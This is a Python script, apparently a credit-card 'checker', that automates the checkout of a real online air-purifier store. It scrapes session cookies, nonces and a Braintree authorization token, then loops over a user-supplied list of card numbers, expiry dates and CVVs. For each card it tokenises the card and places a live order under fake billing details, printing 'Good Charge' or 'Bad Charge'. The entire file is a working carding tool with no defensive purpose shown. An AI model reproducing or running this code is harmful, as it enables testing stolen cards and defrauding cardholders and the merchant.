import requests,base64,json

url = "https://www.winixamerica.com"

params = {
  'wc-ajax': "add_to_cart"
}

payload = "uwRmColorContrast=prs&uwRmSrAriaDescribedby=&uwOriginalHref=https%3A%2F%2Fwww.winixamerica.com%2Fair-purifiers-for-baby-nurseries%2F%3Fadd-to-cart%3D183191&uwRmBrl=PR&product_sku=1022-0221-02-R0&product_id=183191&quantity=1"

headers = {
  'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
  'Accept': "application/json, text/javascript, */*; q=0.01",
  'Content-Type': "application/x-www-form-urlencoded",
  'sec-ch-ua': "\"Chromium\";v=\"124\", \"Brave\";v=\"124\", \"Not-A.Brand\";v=\"99\"",
  'x-requested-with': "XMLHttpRequest",
  'sec-ch-ua-mobile': "?1",
  'sec-ch-ua-platform': "\"Android\"",
  'sec-gpc': "1",
  'accept-language': "ar-EG,ar;q=0.8",
  'origin': "https://www.winixamerica.com",
  'sec-fetch-site': "same-origin",
  'sec-fetch-mode': "cors",
  'sec-fetch-dest': "empty",
  'referer': "https://www.winixamerica.com/air-purifiers-for-baby-nurseries/",
  'priority': "u=1, i",
  'Cookie': "aelia_customer_country=EG; aelia_cs_selected_currency=USD"
}

response = requests.post(url, params=params, data=payload, headers=headers)

co=str(response.cookies)
ses=(co.split('Cookie')[6].split(' ')[1])
cart_hash=(response.json()["cart_hash"])


url = "https://www.winixamerica.com/checkout/"

headers = {
  'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
  'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
  'sec-ch-ua': "\"Chromium\";v=\"124\", \"Brave\";v=\"124\", \"Not-A.Brand\";v=\"99\"",
  'sec-ch-ua-mobile': "?1",
  'sec-ch-ua-platform': "\"Android\"",
  'upgrade-insecure-requests': "1",
  'sec-gpc': "1",
  'accept-language': "ar-EG,ar;q=0.8",
  'sec-fetch-site': "same-origin",
  'sec-fetch-mode': "navigate",
  'sec-fetch-user': "?1",
  'sec-fetch-dest': "document",
  'referer': "https://www.winixamerica.com/air-purifiers-for-baby-nurseries/",
  'priority': "u=0, i",
  'Cookie': f"aelia_customer_country=EG; aelia_cs_selected_currency=USD; woocommerce_items_in_cart=1; {ses}; woocommerce_cart_hash={cart_hash}"
}

response = requests.get(url, headers=headers)

nonce=(response.text.split('name="woocommerce-process-checkout-nonce" value=')[1].split('"')[1])
tokennonce=(response.text.split('"client_token_nonce":')[1].split('"')[1])


url = "https://www.winixamerica.com/wp-admin/admin-ajax.php"

payload = "action=wc_braintree_paypal_get_client_token&nonce=d4dd4fe928"

headers = {
  'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
  #'Accept-Encoding': "gzip, deflate, br, zstd",
  'Content-Type': "application/x-www-form-urlencoded",
  'sec-ch-ua': "\"Chromium\";v=\"124\", \"Brave\";v=\"124\", \"Not-A.Brand\";v=\"99\"",
  'x-requested-with': "XMLHttpRequest",
  'sec-ch-ua-mobile': "?1",
  'sec-ch-ua-platform': "\"Android\"",
  'sec-gpc': "1",
  'accept-language': "ar-EG,ar;q=0.8",
  'origin': "https://www.winixamerica.com",
  'sec-fetch-site': "same-origin",
  'sec-fetch-mode': "cors",
  'sec-fetch-dest': "empty",
  'referer': "https://www.winixamerica.com/checkout/",
  'priority': "u=1, i",
  'Cookie': f"aelia_cs_selected_currency=USD; woocommerce_items_in_cart=1; {ses}; woocommerce_cart_hash={cart_hash}; aelia_customer_country=US"
}

response = requests.post(url, data=payload, headers=headers)

de=(response.json()['data'])
auth=(base64.b64decode(de).decode().split('"authorizationFingerprint":"')[1].split('"')[0])

file=input('enter cc list: ')
g=open(file,'r')	
for g in g:
	c = g.strip().split('\n')[0]
	cc = c.split('|')[0]
	exp=c.split('|')[1]
	ex=c.split('|')[2]
	try:
		exy=ex[2]+ex[3]
		if '2' in ex[3] or '1' in ex[3]:
			exy=ex[2]+'7'
		else:pass
	except:
		exy=ex[0]+ex[1]
		if '2' in ex[1] or '1' in ex[1]:
			exy=ex[0]+'7'
		else:pass
	cvc=c.split('|')[3]
	url = "https://payments.braintree-api.com/graphql"
	
	payload = json.dumps({
	  "clientSdkMetadata": {
	    "source": "client",
	    "integration": "custom",
	    "sessionId": "d60508c7-0fd6-4e56-ae01-3e9040f1992d"
	  },
	  "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }",
	  "variables": {
	    "input": {
	      "creditCard": {
	        "number": cc,
	        "expirationMonth": exp,
	        "expirationYear": "20"+exy,
	        "cvv": cvc
	      },
	      "options": {
	        "validate": False
	      }
	    }
	  },
	  "operationName": "TokenizeCreditCard"
	})
	
	headers = {
	  'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
	  'Accept-Encoding': "gzip, deflate, br, zstd",
	  'Content-Type': "application/json",
	  'sec-ch-ua': "\"Chromium\";v=\"124\", \"Brave\";v=\"124\", \"Not-A.Brand\";v=\"99\"",
	  'sec-ch-ua-mobile': "?1",
	  'authorization': f"Bearer {auth}",
	  'braintree-version': "2018-05-10",
	  'sec-ch-ua-platform': "\"Android\"",
	  'sec-gpc': "1",
	  'accept-language': "ar-EG,ar;q=0.8",
	  'origin': "https://assets.braintreegateway.com",
	  'sec-fetch-site': "cross-site",
	  'sec-fetch-mode': "cors",
	  'sec-fetch-dest': "empty",
	  'referer': "https://assets.braintreegateway.com/",
	  'priority': "u=1, i"
	}
	
	response = requests.post(url, data=payload, headers=headers)
	
	tokencc=(response.json()["data"]["tokenizeCreditCard"]["token"])
	
	url = "https://www.winixamerica.com/wp-admin/admin-ajax.php"

	payload = "action=wc_avatax_validate_customer_address&nonce=6cb669162f&type=billing&address_1=new+york+city+&address_2=&city=new+york+&state=NY&country=US&postcode=10080"
	
	headers = {
	  'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
	  'Accept': "application/json, text/javascript, */*; q=0.01",
	  'Content-Type': "application/x-www-form-urlencoded",
	  'sec-ch-ua': "\"Chromium\";v=\"124\", \"Brave\";v=\"124\", \"Not-A.Brand\";v=\"99\"",
	  'x-requested-with': "XMLHttpRequest",
	  'sec-ch-ua-mobile': "?1",
	  'sec-ch-ua-platform': "\"Android\"",
	  'sec-gpc': "1",
	  'accept-language': "ar-EG,ar;q=0.8",
	  'origin': "https://www.winixamerica.com",
	  'sec-fetch-site': "same-origin",
	  'sec-fetch-mode': "cors",
	  'sec-fetch-dest': "empty",
	  'referer': "https://www.winixamerica.com/checkout/",
	  'priority': "u=1, i",
	  'Cookie': f"aelia_cs_selected_currency=USD; woocommerce_items_in_cart=1; {ses}; woocommerce_cart_hash={cart_hash}; aelia_customer_country=US"
	}
	
	response = requests.post(url, data=payload, headers=headers)
	url = "https://www.winixamerica.com"
	
	params = {
	  'wc-ajax': "checkout"
	}
	
	payload = 'billing_email=aqga347@gmail.com&billing_first_name=jone&billing_last_name=jones&billing_company=&billing_country=US&billing_address_1=NEW+YORK+CITY&billing_address_2=&billing_city=NEW+YORK&billing_state=NY&billing_postcode=10080-0001&billing_phone=501-470-8963&shipping_first_name=&shipping_last_name=&shipping_company=&shipping_country=&shipping_address_1=&shipping_address_2=&shipping_city=&shipping_state=&shipping_postcode=&order_comments=&shipping_method[0]=flat_rate:6&payment_method=braintree_credit_card&wc-braintree-credit-card-card-type=&wc-braintree-credit-card-3d-secure-enabled=&wc-braintree-credit-card-3d-secure-verified=0&wc-braintree-credit-card-3d-secure-order-total=119.75&wc_braintree_credit_card_payment_nonce='+tokencc+'&wc_braintree_device_data={"correlation_id":"1e31a2c123508d29813e6c39b261b6fc"}&wc_braintree_paypal_payment_nonce=&wc_braintree_device_data={"correlation_id":"1e31a2c123508d29813e6c39b261b6fc"}&wc_braintree_paypal_amount=119.75&wc_braintree_paypal_currency=USD&wc_braintree_paypal_locale=en_us&terms=on&terms-field=1&woocommerce-process-checkout-nonce='+nonce+'&_wp_http_referer=/?wc-ajax=update_order_review'
	
	headers = {
	  'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
	  'Accept': "application/json, text/javascript, */*; q=0.01",
	  'Content-Type': "application/x-www-form-urlencoded",
	  'sec-ch-ua': "\"Chromium\";v=\"124\", \"Brave\";v=\"124\", \"Not-A.Brand\";v=\"99\"",
	  'x-requested-with': "XMLHttpRequest",
	  'sec-ch-ua-mobile': "?1",
	  'sec-ch-ua-platform': "\"Android\"",
	  'sec-gpc': "1",
	  'accept-language': "ar-EG,ar;q=0.8",
	  'origin': "https://www.winixamerica.com",
	  'sec-fetch-site': "same-origin",
	  'sec-fetch-mode': "cors",
	  'sec-fetch-dest': "empty",
	  'referer': "https://www.winixamerica.com/checkout/",
	  'priority': "u=1, i",
	  'Cookie': f"aelia_cs_selected_currency=USD; woocommerce_items_in_cart=1; {ses}; aelia_customer_country=US; woocommerce_cart_hash={cart_hash}"
	}
	
	rr = requests.post(url, params=params, data=payload, headers=headers).text
	if '"result":"failure"' in rr:
		print(c+'|Bad Charge 🚫')
	else:
		print(c+'|Good Charge ✅')